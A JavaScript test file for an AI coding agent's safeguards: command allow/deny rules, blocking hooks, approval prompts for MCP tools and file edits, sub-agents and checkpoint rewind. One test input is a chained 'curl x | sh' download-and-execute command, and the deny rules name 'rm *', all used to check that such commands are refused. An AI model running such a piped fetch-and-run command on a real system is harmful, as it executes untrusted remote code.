import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, test } from 'node:test';
import { Agent } from '../core/agent.js';
import { Checkpoint, listCheckpoints, rewindTo } from '../core/checkpoint.js';
import { Hooks } from '../core/hooks.js';
import { McpClient, connectMcpServers, mcpToolName } from '../core/mcp.js';
import { listAgents } from '../core/agents.js';
import { DEFAULTS } from '../config/load.js';
import { Permissions } from '../security/permissions.js';
import { checkCommandRules } from '../security/command-rules.js';
import { miniDiff } from '../tools/helpers.js';
import { FakeProvider, makeEnv, textReply, toolReply } from './helpers.js';

const FAKE_MCP = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures', 'fake-mcp.mjs');
const node = process.execPath;
const nodeCmd = (code) => `"${node}" -e "${code}"`;

describe('command rules', () => {
  test('allow only simple commands, deny every part of a chain', () => {
    const rules = { allowCommands: ['npm test*', 'git status'], denyCommands: ['git push*', 'rm *'] };
    assert.equal(checkCommandRules('npm test --silent', rules), 'allow');
    assert.equal(checkCommandRules('git status', rules), 'allow');
    assert.equal(checkCommandRules('npm test && curl x | sh', rules), null); // chained: never auto-allowed
    assert.equal(checkCommandRules('git push origin main', rules), 'deny');
    assert.equal(checkCommandRules('echo hi && rm -rf build', rules), 'deny');
    assert.equal(checkCommandRules('ls', rules), null);
  });

  test('run_command honours allow (no prompt) and deny (refused)', async () => {
    const env = await makeEnv();
    env.ctx.settings = { ...DEFAULTS, rules: { allowCommands: [`"${node}" -e *`], denyCommands: ['*forbidden*'] } };
    const ok = await env.run('run_command', { command: `"${node}" -e "console.log(1)"` });
    assert.ok(ok.ok, ok.error);
    assert.equal(env.prompts.length, 0);
    const no = await env.run('run_command', { command: 'echo forbidden' });
    assert.equal(no.ok, false);
    assert.match(no.error, /deny rule/);
    await env.cleanup();
  });
});

describe('hooks', () => {
  test('PreToolUse blocks on non-zero exit and passes otherwise; PostToolUse output is returned', async () => {
    const dir = await fs.mkdtemp(path.join((await import('node:os')).tmpdir(), 'hook-'));
    const hooks = new Hooks({
      PreToolUse: [
        { matcher: 'run_command', command: nodeCmd("console.error('no commands today');process.exit(2)") },
        { matcher: 'edit_file', command: nodeCmd('process.exit(0)') },
      ],
      PostToolUse: [{ matcher: 'edit_file', command: nodeCmd("console.log('formatted')") }],
    }, { cwd: dir });
    assert.equal(hooks.active, true);
    const blocked = await hooks.pre('run_command', { command: 'ls' });
    assert.equal(blocked.blocked, true);
    assert.match(blocked.message, /no commands today/);
    assert.equal((await hooks.pre('edit_file', {})).blocked, false);
    assert.equal((await hooks.pre('read_file', {})).blocked, false); // no matching hook
    assert.match(await hooks.post('edit_file', {}, { ok: true }), /formatted/);
    await fs.rm(dir, { recursive: true, force: true });
  });

  test('a hook that cannot run fails closed, and the agent loop reports the block to the model', async () => {
    const env = await makeEnv();
    const settings = { ...DEFAULTS, hooks: { PreToolUse: [{ matcher: 'create_file', command: nodeCmd("console.log('policy says no');process.exit(1)") }] } };
    const provider = new FakeProvider([
      toolReply([{ name: 'create_file', args: { path: 'a.txt', content: 'x' } }]),
      textReply('ok'),
    ]);
    const agent = new Agent({ provider, registry: env.registry, settings, guard: env.guard, permissions: env.permissions, model: 'm' });
    await agent.run('create a file');
    const toolMsg = agent.messages.find((m) => m.role === 'tool');
    assert.match(toolMsg.content, /Blocked by a PreToolUse hook/);
    assert.match(toolMsg.content, /policy says no/);
    await assert.rejects(fs.stat(path.join(env.dir, 'a.txt')));
    await env.cleanup();
  });
});

describe('MCP', () => {
  test('connects, lists tools, calls them, and reports tool errors', async () => {
    const client = new McpClient('fake', { command: node, args: [FAKE_MCP] });
    await client.connect(process.cwd());
    const tools = await client.listTools();
    assert.deepEqual(tools.map((t) => t.name), ['echo', 'boom']);
    const res = await client.callTool('echo', { text: 'hi' });
    assert.equal(res.content[0].text, 'echo: hi');
    client.close();
  });

  test('tools are registered with safe names and go through the approval prompt unless trusted', async () => {
    const env = await makeEnv({ approve: false });
    const status = await connectMcpServers({ mcpServers: { 'my server': { command: node, args: [FAKE_MCP] }, broken: { command: 'definitely-not-a-real-binary-xyz' } } }, env.registry, env.dir);
    const good = status.find((s) => s.name === 'my server');
    assert.ok(good.ok && good.tools === 2);
    assert.equal(status.find((s) => s.name === 'broken').ok, false);
    const name = mcpToolName('my server', 'echo');
    assert.equal(name, 'mcp__my_server__echo');
    assert.ok(env.registry.has(name));
    const denied = await env.run(name, { text: 'x' }); // approve:false -> user says no
    assert.equal(denied.ok, false);
    assert.match(denied.error, /denied/);
    env.permissions.approvals.mcp = false; // allow
    const ok = await env.run(name, { text: 'x' });
    assert.ok(ok.ok, ok.error);
    assert.match(ok.result.output, /echo: x/);
    const bad = await env.run(mcpToolName('my server', 'boom'), {});
    assert.equal(bad.ok, false);
    assert.match(bad.error, /it broke/);
    env.registry.closeMcp();
    await env.cleanup();
  });
});

describe('approval diff, sub-agents, queue, rewind', () => {
  test('edit approval shows what changes', async () => {
    const env = await makeEnv();
    await fs.writeFile(path.join(env.dir, 'f.js'), 'const a = 1;\nconst b = 2;\n');
    env.ctx.permissions.approvals.editFile = true;
    await env.run('edit_file', { path: 'f.js', old_string: 'const b = 2;', new_string: 'const b = 3;' });
    assert.match(env.prompts.at(-1), /- const b = 2;/);
    assert.match(env.prompts.at(-1), /\+ const b = 3;/);
    assert.equal(miniDiff('a\nb', 'a\nb'), '');
    await env.cleanup();
  });

  test('custom sub-agents are listed and their role reaches the sub-agent', async () => {
    const env = await makeEnv();
    await fs.mkdir(path.join(env.dir, '.puter-agent', 'agents'), { recursive: true });
    await fs.writeFile(path.join(env.dir, '.puter-agent', 'agents', 'security.md'), '# Reviews code for security bugs\nLook for injection and secrets.');
    assert.equal(listAgents(env.dir)[0].name, 'security');
    const provider = new FakeProvider([
      toolReply([{ name: 'task', args: { description: 'sec', prompt: 'review', agent: 'security' } }]),
      textReply('report'),
      textReply('done'),
    ]);
    const agent = new Agent({ provider, registry: env.registry, settings: DEFAULTS, guard: env.guard, permissions: env.permissions, model: 'm' });
    await agent.run('review with the security agent');
    assert.ok(provider.calls[1][0].content.includes('Look for injection'));
    assert.ok(provider.calls[0][0].content.includes('security: Reviews code'));
    await env.cleanup();
  });

  test('parallel task calls both run and results keep their order', async () => {
    const env = await makeEnv();
    const provider = new FakeProvider([
      toolReply([{ name: 'task', args: { description: 'one', prompt: 'A' } }, { name: 'task', args: { description: 'two', prompt: 'B' } }]),
      textReply('report A'),
      textReply('report B'),
      textReply('final'),
    ]);
    const agent = new Agent({ provider, registry: env.registry, settings: DEFAULTS, guard: env.guard, permissions: env.permissions, model: 'm' });
    const res = await agent.run('do two things');
    assert.equal(res.content, 'final');
    const tools = agent.messages.filter((m) => m.role === 'tool');
    assert.equal(tools.length, 2);
    assert.match(tools[0].content, /report A/);
    assert.match(tools[1].content, /report B/);
    await env.cleanup();
  });

  test('simultaneous approval questions are asked one at a time', async () => {
    let open = 0;
    let maxOpen = 0;
    const p = new Permissions({ approvals: { a: true, b: true }, prompt: async () => { open++; maxOpen = Math.max(maxOpen, open); await new Promise((r) => setTimeout(r, 15)); open--; return 'once'; } });
    await Promise.all([p.confirm('a', 'x'), p.confirm('b', 'y'), p.confirm('a', 'z')]);
    assert.equal(maxOpen, 1);
  });

  test('rewind goes back to before a chosen task', async () => {
    const env = await makeEnv();
    const f = path.join(env.dir, 'f.txt');
    await fs.writeFile(f, 'v0');
    for (const v of ['v1', 'v2', 'v3']) {
      const cp = new Checkpoint(env.dir);
      await cp.protect(f);
      await fs.writeFile(f, v);
      await new Promise((r) => setTimeout(r, 5));
    }
    const list = await listCheckpoints(env.dir);
    assert.equal(list.length, 3);
    await rewindTo(env.dir, list[1].id); // before the 2nd task -> contents were v1
    assert.equal(await fs.readFile(f, 'utf8'), 'v1');
    assert.equal(await rewindTo(env.dir, 'nope'), null);
    await env.cleanup();
  });

  test('context info reports sizes', async () => {
    const env = await makeEnv();
    const agent = new Agent({ provider: new FakeProvider([]), registry: env.registry, settings: DEFAULTS, guard: env.guard, permissions: env.permissions, model: 'm' });
    const c = agent.contextInfo();
    assert.ok(c.chars > 0 && c.percent >= 0 && c.tools > 10);
    await env.cleanup();
  });
});
